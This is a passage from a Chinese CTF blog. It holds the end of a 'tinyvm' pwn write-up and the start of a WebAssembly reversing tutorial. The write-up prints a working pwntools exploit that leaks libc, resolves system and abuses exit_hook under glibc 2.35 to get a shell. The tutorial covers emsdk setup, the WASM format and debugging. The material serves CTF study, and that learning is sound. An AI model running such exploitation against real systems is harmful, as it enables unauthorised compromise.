title="exp.vm"></a>exp.vm</h3><p>exp中使用了大量的立即数。因为这个里面似乎能直接得到libc地址，加上相关偏移即可。这里其实难点还有一个是怎么获得libc。我这里使用的是<code>libc6_2.35-0ubuntu3_amd64</code>。其中rol的汇编代码是借鉴上述提到的writeup中的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./tvmi&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/home/nicholas/glibc-all-in-one/libs/libc6_2.35-0ubuntu3_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;75&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">setbit1:</span></span><br><span class="line"><span class="string">    cmp ecx, 0</span></span><br><span class="line"><span class="string">    je set0_1</span></span><br><span class="line"><span class="string">    mov ecx, 1</span></span><br><span class="line"><span class="string">set0_1:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setbit2:</span></span><br><span class="line"><span class="string">    cmp edx, 0</span></span><br><span class="line"><span class="string">    je set0_2</span></span><br><span class="line"><span class="string">    mov edx, 1</span></span><br><span class="line"><span class="string">set0_2:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rol: </span></span><br><span class="line"><span class="string">    mov edi, 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    rol_loop:</span></span><br><span class="line"><span class="string">        mov ecx, eax</span></span><br><span class="line"><span class="string">        and ecx, 0x80000000</span></span><br><span class="line"><span class="string">        call setbit1</span></span><br><span class="line"><span class="string">        shl eax, 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edx, ebx</span></span><br><span class="line"><span class="string">        and edx, 0x80000000</span></span><br><span class="line"><span class="string">        call setbit2</span></span><br><span class="line"><span class="string">        shl ebx, 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        or eax, edx</span></span><br><span class="line"><span class="string">        or ebx, ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        inc edi</span></span><br><span class="line"><span class="string">        cmp edi, esi</span></span><br><span class="line"><span class="string">        jl rol_loop</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    mov r13, esp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, [17331215]</span></span><br><span class="line"><span class="string">    mov r08, eax</span></span><br><span class="line"><span class="string">    mov eax, [17331216]</span></span><br><span class="line"><span class="string">    mov r09, eax</span></span><br><span class="line"><span class="string">    sub r09, 163968</span></span><br><span class="line"><span class="string">    mov r15, r09</span></span><br><span class="line"><span class="string">    mov r14, r08</span></span><br><span class="line"><span class="string">    prn r14</span></span><br><span class="line"><span class="string">    prn r15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add esp, 65028080</span></span><br><span class="line"><span class="string">    sub esp, 10376</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r12, ebp</span></span><br><span class="line"><span class="string">    mov esp, ebp</span></span><br><span class="line"><span class="string">    add r09, 331104</span></span><br><span class="line"><span class="string">    mov eax, r08</span></span><br><span class="line"><span class="string">    mov ebx, r09</span></span><br><span class="line"><span class="string">    mov esi, 17</span></span><br><span class="line"><span class="string">    call rol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov r08, eax</span></span><br><span class="line"><span class="string">    mov r09, ebx</span></span><br><span class="line"><span class="string">    prn r08</span></span><br><span class="line"><span class="string">    prn r09</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax, r14</span></span><br><span class="line"><span class="string">    mov ebx, r15</span></span><br><span class="line"><span class="string">    add ebx, 1935000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov esp, r13</span></span><br><span class="line"><span class="string">    prn esp</span></span><br><span class="line"><span class="string">    add esp, 67235596</span></span><br><span class="line"><span class="string">    push r09</span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push r08</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push ebx</span></span><br><span class="line"><span class="string">    add esp, 8</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">end:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">&#x27;./exp.vm&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">fin.write(file1)</span><br><span class="line">fin.close()</span><br><span class="line"></span><br><span class="line">script  = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">b __run_exit_handlers</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(argv=[filename,<span class="string">&quot;./exp.vm&quot;</span>])</span><br><span class="line"><span class="comment"># io = gdb.debug([elf.path,&quot;./exp.vm&quot;], gdbscript=script)</span></span><br><span class="line">num1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="string">&quot;hex num1: &quot;</span> + <span class="built_in">hex</span>(num1))</span><br><span class="line">num2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="string">&quot;hex num2: &quot;</span> + <span class="built_in">hex</span>(num2))</span><br><span class="line"><span class="keyword">if</span>(num2&lt;<span class="number">0</span>):</span><br><span class="line">    num2 = - num2</span><br><span class="line">libc_base= ((num1&lt;&lt;<span class="number">32</span>) | num2)</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/rwctf-tinyvm/image-20230120154910423.png" alt="image-20230120154910423"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道洞比较常见，但是利用方式比较新颖的vm，学习到了<strong>2.35下的exit_hook</strong>，以及诸多got表的利用。另外还有写fs的神奇操作。</p><p>此外，还有直接从gdb中启动程序，并且使得地址空间为常规启动时的方法(直接gdb file相关偏移是不正确的)</p><p>好久没有做题目了，会感觉还是挺生疏的，光调试就花了将近一天的时间。但是收获满满~</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
            <tag> exit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wasm-1</title>
      <link href="/2023/01/19/wasm-pwn/"/>
      <url>/2023/01/19/wasm-pwn/</url>
      
        <content type="html"><![CDATA[<p>关于WASM的基础知识学习。<br>前一段时间都在实习和做实验室安排的工作，好久没打CTF了。这次参加idekCTF也是感觉力不从心。下学期还有实习，希望能抽出时间看看题目</p><span id="more"></span><h1 id="WASM-pwn"><a href="#WASM-pwn" class="headerlink" title="WASM pwn"></a>WASM pwn</h1><p>wasm是google开发的一款浏览器中使用的汇编语言，全程为web assembly。设计的初衷是使用c原生binary加速jiavascript的计算行为。wasm编译形成的binary类似一种基于栈的虚拟机，有自己的编译器和指令集。<a href="https://webassembly.org/">WASM官网</a>。</p><p>那么对于一个PWN手而言，这当然是非常惊喜的。毕竟为了效率在浏览器中使用低级语言，虽然在虚拟机中，依然可能为我们增加攻击的机会。WASM曾在<a href="https://www.youtube.com/watch?v=DFPD9yI-C70">2018年上过BlackHat的议题</a></p><p>一个非常详细的WASM逆向指南可以参考<a href="https://www.pnfsoftware.com/reversing-wasm.pdf">网站</a></p><h2 id="部署开发环境"><a href="#部署开发环境" class="headerlink" title="部署开发环境"></a>部署开发环境</h2><p>首先我们可以跟着<a href="http://webassembly.org.cn/getting-started/developers-guide/">网站</a>布置一个简单的WASM开发环境。需要一些前置条件例如llvm，git，python等。</p><h3 id="安装emsdk"><a href="#安装emsdk" class="headerlink" title="安装emsdk"></a>安装emsdk</h3><p>注意，和中文版官网的说法不同，需要按照README中提到的方法进行安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/juj/emsdk.git</span><br><span class="line">cd emsdk</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置环境变量</span></span><br><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure><h3 id="创建第一个wasm程序"><a href="#创建第一个wasm程序" class="headerlink" title="创建第一个wasm程序"></a>创建第一个wasm程序</h3><p>我们编写一个hello.c文件，并用以下语句编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：-s WASM如果不指定，将只会生成asm.js文件</span></span><br><span class="line">emcc hello.c -s WASM=1 -o hello.html</span><br></pre></td></tr></table></figure><p>之后在当前目录下产生一个简单的server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emrun --no_browser --port 8080 .</span><br></pre></td></tr></table></figure><p>之后访问<code>127.0.0.1:8080/hello.html</code>可以看到<code>hello world</code>的消息。以及emsc控制台的界面。</p><p><img src="/2023/01/19/wasm-pwn/image-20230117205646748.png" alt="image-20230117205646748"></p><h2 id="WASM文件格式"><a href="#WASM文件格式" class="headerlink" title="WASM文件格式"></a>WASM文件格式</h2><p>和一般的binary文件不同，WASM文件一般只包含四种段。</p><ul><li>memory space: 可以通过load/store访问到的线性内存，可读可写</li><li>table space: 包含一系列函数指针，用来非直接的调用函数，只读</li><li>global space: 包含只读或者只写的变量</li><li>function space: 包含所有外部函数以及他们的函数体。只读</li></ul><p>上述是对于静态环境而言的。如果对于执行中的wasm文件，还有两种新的space。</p><ul><li>local and parameter variable space: 保存临时变量以及函数参数(回忆一下，WASM是一种基于栈的虚拟机，没有寄存器)</li><li>operand stack: 用于加减乘除指令push操作数。</li></ul><h3 id="WASM指令集"><a href="#WASM指令集" class="headerlink" title="WASM指令集"></a>WASM指令集</h3><p>WASM的所有opcode，都可以用0x0~0xff这256中数字表示(一字节)。主要包含以下集中operator</p><ul><li>control flow operator: 包含了标签的定义，条件/无条件跳转，类似switch的表示，branch等</li><li>本地变量相关operator：包括read/write等</li><li>内存访问相关operator： load/store等</li><li>常量operator：在栈上push硬编码的整形或者浮点型</li><li>比较operator：相等/不相等</li><li>数学计算operator：add/mul/div等</li></ul><h2 id="WASM的逆向"><a href="#WASM的逆向" class="headerlink" title="WASM的逆向"></a>WASM的逆向</h2><p>对于binary类型的WASM，一般的IDA是无法解析的。我们可以通过<a href="https://github.com/WebAssembly/wabt">wasm2wat</a>来生成一种所谓的S表达式。S表达式和WASM bitcode的关系就类似于c语言bytecode和汇编的关系。不过S表达式更容易看明白。这里的S含义就是symbol，因为S表达式实际上是一种符号化表示(symbolic representation)。类似下图。符号化表示能自动帮助我们把相同变量用一些固定的符号代替。同时由于WASM没有寄存器操作，因此不会有寄存器。</p><p><img src="/2023/01/19/wasm-pwn/image-20230117205827739.png" alt="一个S-表达式的例子"></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>现成的工具可以从<a href="https://github.com/WebAssembly/wabt#cloning">网站</a>找到。直接clone并安装即可。</p><p>同时，github上面由对应的<a href="https://github.com/mandiant/idawasm">IDA插件</a>可以下载。不过似乎也只能做到类似wasm2wat的反编译级别，也就是还是无法输出伪代码。</p><p>目前针对WASM格式的反编译软件只有JEB一家。看雪上有相关资源。</p><h3 id="简单举例"><a href="#简单举例" class="headerlink" title="简单举例"></a>简单举例</h3><p>我们来看一段简单的指令。指令右侧部分指代了operand stack中operand的个数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Function f: (i32,i32)i32</span><br><span class="line">    0 get_local $0                     [1]</span><br><span class="line">    0 get_local $1                     [2]</span><br><span class="line">    0 i32.le_s                         [1]</span><br><span class="line">    0 set_local $2                     [0]</span><br><span class="line">    0 get_local $2                     [1]</span><br><span class="line">    0 if $I1(i32)                      [0]</span><br><span class="line">    1   i32.const 3                    [1]</span><br><span class="line">    1   else                           [0]</span><br><span class="line">    1   i32.const 4                    [1]</span><br><span class="line">    1   end                            [1]</span><br><span class="line">    0 set_local $3                     [0]</span><br><span class="line">    0 get_local $3                     [1]</span><br><span class="line">    0 return                           [0]</span><br><span class="line">    0 end                              [0]</span><br></pre></td></tr></table></figure><p>首先，在函数签名中可以看到函数参数以及函数返回值。$0, $1指代两个函数参数。注意get_local并不是从栈中取出一个变量，而是将一个东西push到operand栈上。因此两次get_local之后，我们将得到一个大小为2的operand stack。</p><p><code>le_s</code>是<code>less or equal, signed</code>的缩写。他将会从operand stack上pop出来两个值，然后对他们进行比较。这里就是比较$0&lt;=$1。并将结果写回到栈上。</p><p>之后一个set_local和get_local没有任何意义，跳过。就是把内容储存到栈上。</p><p>注意if这一句，$I1(i32)表示查看当前operand stack里面，最上面的一个是否是1，如果是，就进入，否则进入else部分。同时这个I(英文i)也指代了返回值是一个Int。</p><p>后来的内容就比较好理解了。通过const将一个立即数放入operand stack上，并返回。总的来说，上面代码的含义是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> $<span class="number">1</span>, <span class="type">int</span> $<span class="number">2</span>)</span></span><br><span class="line"><span class="keyword">return</span> $0 &lt;= $<span class="number">1</span> ? <span class="number">3</span>:<span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="函数跳转"><a href="#函数跳转" class="headerlink" title="函数跳转"></a>函数跳转</h3><p>我们来看一下官网给出的第二个例子。这是一个通过函数指针进行跳转的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  emcc 2.c -s WASM=1 -s SIDE_MODULE=1 -o 2.wasm</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">x0</span><span class="params">(<span class="type">int</span> val)</span> &#123;<span class="keyword">return</span> val + <span class="number">8800</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">x1</span><span class="params">(<span class="type">int</span> val)</span> &#123;<span class="keyword">return</span> val - <span class="number">8811</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">x2</span><span class="params">(<span class="type">int</span> val)</span> &#123;<span class="keyword">return</span> val * <span class="number">8822</span>;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">x3</span><span class="params">(<span class="type">int</span> val)</span> &#123;<span class="keyword">return</span> val / <span class="number">8833</span>;&#125;<span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(* PFUNC)</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line">PFUNC pfuncs[] = &#123;x0, x1, x0, x2, x2&#125;;<span class="type">int</span> <span class="title function_">z</span><span class="params">(<span class="type">int</span> val, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">  PFUNC f = pfuncs[index + <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> f(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将被编译成如下内容。注意看S表达式，其实每一个缩进都是由原因的。例如下面的set_local表示设置一个寄存器，而后面跟着的get_local则表示从栈上取出的内容，一开始是由什么产生的。此外，例如add也是如此，add后面跟着的两个操作数会表示出来隐式的栈操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  ...</span><br><span class="line">  (func $_z (export &quot;_z&quot;) (type $t4) (param $p0 i32)</span><br><span class="line">                                     (param $p1 i32) (result i32)</span><br><span class="line">    ...</span><br><span class="line">   # 将函数参数复制到本地变量</span><br><span class="line">    (set_local $l2</span><br><span class="line">      (get_local $p0))</span><br><span class="line">    (set_local $l3</span><br><span class="line">      (get_local $p1))</span><br><span class="line">    (set_local $l5</span><br><span class="line">      (get_local $l3))</span><br><span class="line">      # 构造一个$p1+2</span><br><span class="line">    (set_local $l6</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_local $l5)</span><br><span class="line">        (i32.const 2)))</span><br><span class="line">      # 从memorybase中取出对应函数的地址。其中对$16做了左移操作，左移两位。这是因为一个地址大小为4， 需要将index左移两位。</span><br><span class="line">    (set_local $l7</span><br><span class="line">      (i32.add</span><br><span class="line">        (i32.add</span><br><span class="line">          (get_global $env.memoryBase)</span><br><span class="line">          (i32.const 0))</span><br><span class="line">        (i32.shl</span><br><span class="line">          (get_local $l6)</span><br><span class="line">          (i32.const 2))))</span><br><span class="line">    # 获取上面计算的函数指针位置</span><br><span class="line">    (set_local $l8</span><br><span class="line">      (i32.load</span><br><span class="line">        (get_local $l7)))</span><br><span class="line">    (set_local $l4</span><br><span class="line">      (get_local $l8))</span><br><span class="line">    (set_local $l9</span><br><span class="line">      (get_local $l4))</span><br><span class="line">    (set_local $l0</span><br><span class="line">      (get_local $l2))</span><br><span class="line">    # 调用此函数指针,并布置参数</span><br><span class="line">    (set_local $l1</span><br><span class="line">      (call_indirect (type $t0)</span><br><span class="line">        (get_local $l0)</span><br><span class="line">        (get_local $l9)))</span><br><span class="line">    (set_global $g10</span><br><span class="line">      (get_local $l11))</span><br><span class="line">    (return</span><br><span class="line">      (get_local $l1)))</span><br><span class="line">  ...</span><br><span class="line">  (func $runPostSets (export &quot;runPostSets&quot;) (type $t5)</span><br><span class="line">    (local $l0 i32)</span><br><span class="line">    (i32.store</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_global $env.memoryBase)</span><br><span class="line">        (i32.const 0))</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_global $env.tableBase)</span><br><span class="line">        (i32.const 1)))</span><br><span class="line">    (i32.store</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_global $env.memoryBase)</span><br><span class="line">        (i32.const 4))</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_global $env.tableBase)</span><br><span class="line">        (i32.const 2)))</span><br><span class="line">  ...</span><br><span class="line">  (elem (get_global 1) $f14 $_x0 $_x1 $_x2 $_x3 $_z $f14 $f14))</span><br></pre></td></tr></table></figure><p>因此，反编译之后的伪代码可以是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> FUNC_INDEX = *(i32*)(memoryBase + <span class="number">0</span> + (<span class="number">2</span> + index) &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> CALL_INDIRECT(val, FUNC_INDEX);</span><br></pre></td></tr></table></figure><h3 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h3><p>对于栈而言，主要是通过一对寄存器储存了栈的顶端和底端的地址。并通过这两个地址检查栈操作是否产生越界。如下是一个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(func $_fbu (type $t0) (param $p0 i32) (result i32)</span><br><span class="line">    (local $l0 i32) ... (local $l14 i32)</span><br><span class="line">    (set_local $l14       &lt;--- SP($l14)</span><br><span class="line">      (get_global $g10))</span><br><span class="line">    # 设置栈顶位置。下一行官网写的是set_global $g10，但是我认为应该是$g11，用来指示栈顶</span><br><span class="line">    (set_global $g11</span><br><span class="line">      (i32.add</span><br><span class="line">        (get_global $g10)</span><br><span class="line">        (i32.const 1040)))</span><br><span class="line">    # 判断是否发生越界</span><br><span class="line">    (if $I0</span><br><span class="line">      (i32.ge_s</span><br><span class="line">        (get_global $g10)</span><br><span class="line">        (get_global $g11))</span><br><span class="line">      (then</span><br><span class="line">        (call $env.abortStackOverflow</span><br><span class="line">          (i32.const 1040))))</span><br><span class="line">    ... routine body ...</span><br><span class="line">    # 设置SP指针为原先指针位置，即返回到上一个函数的栈</span><br><span class="line">    (set_global $g10</span><br><span class="line">      (get_local $l14))</span><br><span class="line">    (return ...</span><br></pre></td></tr></table></figure><p>能够看懂上面两个例子，那么这边也变得非常好理解了。如下是反汇编得到的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = STACKTOP;</span><br><span class="line">STACKTOP += <span class="number">1040</span>;</span><br><span class="line"><span class="keyword">if</span>(SP &gt;= SP_MAX) &#123; abortStackOverflow(<span class="number">1040</span>); &#125;</span><br><span class="line">...</span><br><span class="line">STACKTOP = SP;</span><br><span class="line"><span class="keyword">return</span> ... ;</span><br></pre></td></tr></table></figure><h1 id="WASM的调试"><a href="#WASM的调试" class="headerlink" title="WASM的调试"></a>WASM的调试</h1><p>可以参考<a href="https://developer.chrome.com/blog/wasm-debugging-2020/">这篇文章</a>。所需的环境是google chrome。由于题目给了源码我们可以加上-g的flag编译。再chrome中找到如下内容。点击源码就可以在源码上下断点调试。首先我们需要设置再进入js时就暂停</p><p><img src="/2023/01/19/wasm-pwn/image-20230125134048289.png" alt="image-20230125134048289"></p><p>接下来再目标位置下断点</p><p><img src="/2023/01/19/wasm-pwn/image-20230125133345835.png" alt="image-20230125133345835"></p><p>注意需要把标准库也放在我们启动server的根目录下。可以看到这里我一开始没有放，出现了一个报错。报错也告诉了我们google使用的是musl libc来进行堆块分配的。</p><p><img src="/2023/01/19/wasm-pwn/image-20230125133520910.png" alt="image-20230125133520910"></p><p>而对于堆块的分配，可以看到使用的是dlmalloc.c</p><p><img src="/2023/01/19/wasm-pwn/image-20230125133950621.png" alt="image-20230125133950621"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="picoctf2021-some-assembly-required-4"><a href="#picoctf2021-some-assembly-required-4" class="headerlink" title="picoctf2021 some assembly required 4"></a>picoctf2021 some assembly required 4</h2><p>先从一个比较容易入手的地方开始。<a href="https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021/web/some_assembly_required_4/source.wat">题目链接</a></p><p>这其实是一个逆向题，程序直接给出了一个wasm的反汇编结果。其实这就是看起来比较麻烦。本质上就是一个简单的flag checker和输入。下面是用JEB反编译的结果。</p><p><img 